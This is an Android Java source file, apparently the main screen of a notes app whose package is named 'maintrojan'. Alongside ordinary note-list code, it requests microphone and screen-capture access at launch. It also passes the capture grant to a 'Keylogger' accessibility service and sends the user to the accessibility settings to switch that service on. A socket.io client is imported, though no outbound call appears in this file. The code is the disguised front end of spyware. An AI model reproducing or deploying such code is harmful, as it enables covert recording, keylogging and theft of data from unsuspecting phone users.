package com.example.maintrojan;

import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.SwitchCompat;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.ItemTouchHelper;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.Switch;
import android.widget.Toast;

import com.example.maintrojan.adpater.RecyclerViewAdpater;
import com.google.android.material.floatingactionbutton.FloatingActionButton;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.security.Key;
import java.util.Arrays;
import java.util.List;


import io.socket.client.Socket;
import io.socket.emitter.Emitter;

public class MainActivity extends AppCompatActivity {
    final String TAG = "myTrojan";
    public MediaProjectionManager mProjectionManager;
    public SharedPreferences sharedPreferences;
    public SharedPreferences.Editor editor;
    JSONArray jArray = null;
    int RecordAudioRequestCode = 1001;

    RecyclerView recyclerView;
    RecyclerViewAdpater adpater;
    public static int  recyclerPos = -1;

    ActivityResultLauncher<Intent> startForResult = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), new ActivityResultCallback<ActivityResult>() {
        @Override
        public void onActivityResult(ActivityResult result) {
            if(result != null && result.getResultCode() == RESULT_OK){
                if(result.getData() != null){
                    if(!isAccessibilityServiceEnabled(getApplicationContext(), Keylogger.class)){
                        Keylogger.intent = result.getData();
                        Keylogger.resCode = result.getResultCode();
                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    }
                }
            }
        }
    });

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Check permission
        mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        if(ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            checkPermission();
        }else{
            startForResult.launch(mProjectionManager.createScreenCaptureIntent());
        }

        FloatingActionButton addBnt = (FloatingActionButton) findViewById(R.id.floatingActionButton);
        recyclerView = (RecyclerView) findViewById(R.id.list1);
        recyclerView.setLayoutManager(new LinearLayoutManager(this,LinearLayoutManager.VERTICAL,true));


        sharedPreferences = getSharedPreferences("shared", Context.MODE_PRIVATE);
        editor = sharedPreferences.edit();

        addBnt.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                editor.putBoolean("updated",false);
                editor.commit();
                Intent intent = new Intent(getApplicationContext(),NoteActivity.class);
                intent.putExtra("type","add");
                recyclerPos = -1;
                startActivity(intent);
            }
        });



        try {
            String data = sharedPreferences.getString("data",null);
            if(data != null){
                Log.d(TAG, data);
                jArray = new JSONArray(data);


                adpater = new RecyclerViewAdpater(this,jArray);
                recyclerView.setAdapter(adpater);
            }
        } catch (JSONException e) {
            Log.d(TAG, e.getMessage());
        }


        ItemTouchHelper helper = new ItemTouchHelper(new ItemTouchHelper.Callback() {
            @Override
            public int getMovementFlags(@NonNull RecyclerView recyclerView, @NonNull RecyclerView.ViewHolder viewHolder) {
                return makeMovementFlags(0,ItemTouchHelper.END);
            }

            @Override
            public boolean onMove(@NonNull RecyclerView recyclerView, @NonNull RecyclerView.ViewHolder viewHolder, @NonNull RecyclerView.ViewHolder target) {
                return false;
            }

            @Override
            public void onSwiped(@NonNull RecyclerView.ViewHolder viewHolder, int direction) {
                jArray.remove(viewHolder.getAdapterPosition());
                adpater.notifyItemRemoved(viewHolder.getAdapterPosition());
                try {
                    editor.putString("data",jArray.toString(0));
                    editor.commit();
                } catch (JSONException e) {
                    Log.d(TAG, e.getMessage());
                }
            }
        });
        helper.attachToRecyclerView(recyclerView);
    }
    private void checkPermission() {
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.RECORD_AUDIO}, RecordAudioRequestCode);
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == RecordAudioRequestCode && grantResults.length > 0 ){
            if(grantResults[0] == PackageManager.PERMISSION_GRANTED)
                Toast.makeText(this,"Permission Granted",Toast.LENGTH_SHORT).show();
            startForResult.launch(mProjectionManager.createScreenCaptureIntent());
        }
    }
    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> service) {
        AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

        for (AccessibilityServiceInfo enabledService : enabledServices) {
            ServiceInfo enabledServiceInfo = enabledService.getResolveInfo().serviceInfo;
            if (enabledServiceInfo.packageName.equals(context.getPackageName()) && enabledServiceInfo.name.equals(service.getName()))
                return true;
        }

        return false;
    }



    @Override
    protected void onRestart() {
        super.onRestart();
        boolean update = sharedPreferences.getBoolean("updated",false);
        Log.d(TAG, String.valueOf(update));
        if(update){
            String data = sharedPreferences.getString("nextVal",null);
            if(data != null){
                if(jArray != null){
                    if(recyclerPos == -1){
                        // new entry
                        jArray.put(data);
                        adpater.notifyItemChanged(jArray.length()-1);

                    }else{
                        // updated
                        try {
                            jArray.put(recyclerPos,data);
                            adpater.notifyItemChanged(recyclerPos);

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }


                }else{
                    jArray = new JSONArray();
                    jArray.put(data);

                    adpater = new RecyclerViewAdpater(this,jArray);
                    recyclerView.setAdapter(adpater);
                }
            }
        }
    }
}